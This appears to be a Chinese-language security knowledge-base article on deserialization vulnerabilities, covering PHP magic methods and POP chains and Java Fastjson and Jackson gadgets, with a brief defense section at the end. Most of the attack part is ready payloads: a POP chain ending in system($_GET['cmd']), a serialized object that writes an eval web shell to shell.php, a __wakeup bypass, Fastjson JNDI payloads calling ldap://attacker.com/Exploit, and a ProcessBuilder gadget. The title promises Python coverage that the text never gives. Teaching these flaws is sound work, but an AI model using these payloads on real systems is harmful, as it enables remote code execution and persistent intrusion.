---
title: "反序列化漏洞详解"
description: "PHP/Java/Python反序列化漏洞原理、POP链构造与实战利用"
pubDate: 2026-05-18
heroImage: ""
tags: ["漏洞原理", "反序列化", "Web安全"]
category: "kb"
severity: "critical"
cve: ""
vul_type: "Deserialization"
---

# 反序列化漏洞详解

## 漏洞原理

序列化是将对象转换为可存储/传输的字符串格式，反序列化则是将字符串恢复为对象。

**问题所在：** 反序列化时，如果类中有魔术方法（Magic Methods），会在特定时机自动执行，攻击者可以通过构造恶意序列化数据触发代码执行。

```
对象 → serialize() → 字符串 → unserialize() → 对象（触发魔术方法）
```

---

## PHP 反序列化

### PHP魔术方法

| 方法 | 触发时机 |
|------|---------|
| `__construct()` | 对象创建时 |
| `__destruct()` | 对象销毁时 |
| `__sleep()` | serialize()时 |
| `__wakeup()` | unserialize()时 |
| `__toString()` | 对象被当作字符串时 |
| `__invoke()` | 对象被当作函数调用时 |
| `__call()` | 调用不存在的方法时 |

### PHP POP链构造

```php
<?php
// 恶意类
class PopChain {
    public $obj;
    function __destruct() {
        $this->obj->action();  // 触发__call
    }
}

class EvilClass {
    function action() {
        system($_GET['cmd']);  // RCE!
    }
}

// 构造序列化数据
$evil = new EvilClass();
$pop = new PopChain();
$pop->obj = $evil;
echo serialize($pop);
```

### PHP反序列化Getshell

```php
<?php
// 绕过__wakeup
class FileOperations {
    public $filename;
    public $data;
}

$obj = new FileOperations();
$obj->filename = "shell.php";
$obj->data = "<?php @eval($_POST[x]);?>";
echo serialize($obj);
// O:14:"FileOperations":2:{s:8:"filename";s:9:"shell.php";s:4:"data";s:25:"<?php @eval($_POST[x]);?>";}

// CVE-2016-7124 绕过wakeup
// 对象属性数量与实际不符时，__wakeup会被绕过
// O:14:"FileOperations":3:{...}  → 属性数改成3会绕过wakeup
?>
```

---

## Java 反序列化

### Java反序列化POP链

```
ObjectInputStream.readObject()
  → Serializable对象
    → readObject()
      → 自定义readObject
        → hook方法
          → TemplatesImpl.getOutputProperties()  (RCE!)
          → Runtime.exec()
          → ProcessBuilder.start()
```

### Fastjson反序列化

```java
// 恶意JSON
{
    "@type": "com.sun.rowset.JdbcRowSetImpl",
    "dataSourceName": "ldap://attacker.com/Exploit",
    "autoCommit": true
}

// 触发JNDI注入
// 攻击者服务器返回恶意Java类 → RCE

// 版本<1.2.48
{"@type":"java.lang.Class","val":"xxx"}

// 版本1.2.48-1.2.68
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64恶意字节码"],"_name":"a","_tfactory":{},"_outputProperties":{}}
```

### Jackson反序列化

```java
// CVE-2020-24616
{
    "@class": "br.com.querico.gumps.User",
    "name": "test"
}

// Jackson允许自定义类型
ObjectMapper mapper = new ObjectMapper();
mapper.enableDefaultTyping();  // 开启后危险

// 构造恶意类
{
    "@class": "java.lang.ProcessBuilder",
    "constructor": [{"@class": "java.util.ArrayList"}],
    "command": ["calc.exe"]
}
```

---

## 防御方案

```php
// PHP 防御
// 1. 不要反序列化用户输入
// 2. 使用json_encode/json_decode代替

// Java 防御
// 1. 使用SerialKiller
ObjectInputStream ois = new CustomObjectInputStream();
ois.registerValidation(new SerialKiller(), 0);

// 2. 黑名单
if (className.startsWith("org.apache.commons")) {
    throw new InvalidClassException("Blocked!");
}

// 3. 反序列化Hook
class AllowedTypesValidation implements ObjectInputFilter {
    public ObjectInputFilter.Status checkInput(ObjectInputFilter.FilterInfo info) {
        if (info.serialClass() != null) {
            String name = info.serialClass().getName();
            if (!ALLOWED_PACKAGES.contains(name)) {
                return Status.REJECTED;
            }
        }
        return Status.ALLOWED;
    }
}
```
